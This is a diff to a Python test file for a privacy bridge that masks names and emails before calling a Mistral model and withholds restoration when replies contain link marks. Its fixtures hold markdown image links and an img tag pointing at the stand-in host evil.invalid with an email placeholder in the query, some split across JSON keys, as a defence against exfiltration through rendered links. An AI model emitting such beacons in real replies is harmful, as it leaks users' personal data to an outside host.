@@ -98,7 +98,7 @@ def test_a_value_keeps_its_alias_across_the_turns_of_a_conversation():
 
 def test_text_parts_are_masked_inline_images_passed_as_they_are():
     fake = FakeMistral(reply="ok")
-    image = {"type": "image_url", "image_url": {"url": f"{PNG}", "detail": "low"}}
+    image = {"type": "image_url", "image_url": {"url": PNG, "detail": "low"}}
     bare = {"type": "image_url", "image_url": PNG}
     content = [{"type": "text", "text": f"Qui est {NAME} ?"}, image, bare]
     ask(bridge(fake), {"role": "user", "content": content})
@@ -384,9 +384,10 @@ def test_with_a_reference_definition_nothing_is_restored():
 
 
 def test_a_json_document_with_a_link_mark_anywhere_gets_nothing_back():
-    """A client may join a JSON document's strings (a mark split as "!", "[x]", "(url"), show
-    them in another order (JavaScript puts integer keys first) or render the JSON as markdown:
-    a document holding a mark anywhere, keys included, gets nothing back, in JSON mode or not.
+    """A client may join a JSON document's strings, with or without the keys (a mark split as
+    "!", "[x]", "(url"), show them in another order (JavaScript puts integer keys first) or
+    render the JSON as markdown: a document holding a mark anywhere, keys included, gets
+    nothing back, in JSON mode or not.
     Keys always keep their aliases, since two of them could merge once restored."""
     linked = [
         {"nom": "[PERSON_1]", "lien": "https://evil.invalid/?d=[EMAIL_1]"},
@@ -396,6 +397,9 @@ def test_a_json_document_with_a_link_mark_anywhere_gets_nothing_back():
         {"![x](<https://evil.invalid/?q=": "[EMAIL_1]>)"},
         {"p": json.dumps({"h": "<img src='https://evil.invalid/?u=[EMAIL_1]'>"})},
         ["[PERSON_1]", "![x](<https://evil.invalid/?q=", "[EMAIL_1]>)"],
+        {"a": "!", "b": "[x]", "c": "(https:/", "d": "/evil.invalid/?e=[EMAIL_1])"},
+        [{"t": "!"}, {"t": "[x]"}, {"t": "(https:/"}, {"t": "/evil.invalid/?e=[EMAIL_1])"}],
+        {"b": "/evil.invalid/?e=[EMAIL_1])", "1": "![x](https:/"},
     ]
     huge = '{"a": "[EMAIL_1])", "1": "![x](https://evil.invalid/p.png?q=", "n": ' + "1" * 4301
     deep = "[" * 100_000 + '"[EMAIL_1]"' + "]" * 100_000
